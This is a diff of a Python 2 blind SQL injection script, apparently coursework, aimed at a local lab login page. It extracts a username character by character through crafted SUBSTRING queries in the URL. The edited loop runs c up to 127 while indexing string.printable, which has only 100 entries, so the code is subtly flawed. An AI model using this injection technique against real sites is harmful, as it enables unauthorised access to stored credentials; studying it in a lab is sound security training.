@@ -14,7 +14,7 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 #print bashCommand
 
 
-
+listASCII=string.printable
 
 for x in xrange(1,10):
 	pass
@@ -32,11 +32,11 @@ for s in xrange(0,40):
 for pos in xrange(1,size+1):
 
 	for c in xrange(0,128):
-		request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(username,"+ str(pos) +",1)%20=%20%27" + chr(c) + "%27%20--%20" 
+		request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(username,"+ str(pos) +",1)%20=%20%27" + listASCII[c] + "%27%20--%20" 
 		f = urllib.urlopen(request)
 		response = f.read()
 		if (response.find('cat.JPG')!=-1): 
-			print "found letter %s at position %d" %(chr(c),pos)
+			print "found letter %s at position %d" %(listASCII[c],pos)
 			break
 
 
